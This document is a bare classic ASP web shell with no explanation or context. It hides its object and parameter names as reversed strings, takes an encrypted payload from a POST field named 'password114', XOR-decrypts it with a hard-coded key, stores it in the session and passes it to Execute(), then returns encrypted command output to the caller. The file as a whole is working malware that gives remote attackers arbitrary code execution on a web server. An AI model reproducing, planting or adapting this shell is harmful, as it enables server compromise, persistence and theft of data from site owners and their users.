<%
Set bypassDictionary = Server.CreateObject("Scripting.Dictionary")
Function rs(ips)
    Dim rss
    rss = ""
    For i = Len(ips) To 1 Step -1
        rss = rss & Mid(ips, i, 1)
    Next
    rs = rss
End Function
Function Base64Decode(ByVal vCode)
    Dim oXML, oNode
    Set oXML = CreateObject(rs("0.3.tnemucoDMOD.2lmxsM"))
    Set oNode = oXML.CreateElement(rs("46esab"))
    oNode.dataType = rs("46esab.nib")
    oNode.text = vCode
    Base64Decode = oNode.nodeTypedValue
    Set oNode = Nothing
    Set oXML = Nothing
End Function
Function decryption(content,isBin)
    dim size,i,result,keySize
    keySize = len(key)
    Set BinaryStream = CreateObject(rs("maertS.BDODA"))
    BinaryStream.CharSet = "iso-8859-1"
    BinaryStream.Type = 2
    BinaryStream.Open
    if IsArray(content) then
        size=UBound(content)+1
        For i=1 To size
            BinaryStream.WriteText chrw(ascb(midb(content,i,1)) Xor Asc(Mid(key,(i mod keySize)+1,1)))
        Next
    end if
    BinaryStream.Position = 0
    if isBin then
        BinaryStream.Type = 1
        decryption=BinaryStream.Read()
    else
        decryption=BinaryStream.ReadText()
    end if
End Function
    key="32150285b345c48a"
    content=request.Form(rs("411drowssap"))
    if not IsEmpty(content) then

        if  IsEmpty(Session(rs("daolyap"))) then
            content=decryption(Base64Decode(content),false)
            Session(rs("daolyap"))=content
            response.End
        else
            content=decryption(Base64Decode(content),true)
            bypassDictionary.Add rs("daolyap"),Session(rs("daolyap"))
            Execute(bypassDictionary(rs("daolyap")))
            result=run(content)
            response.Write(rs("e6f65b"))
            if not IsEmpty(result) then
                response.Write Base64Encode(decryption(result,true))
            end if
            response.Write(rs("bfb66d"))
        end if
    end if
%>
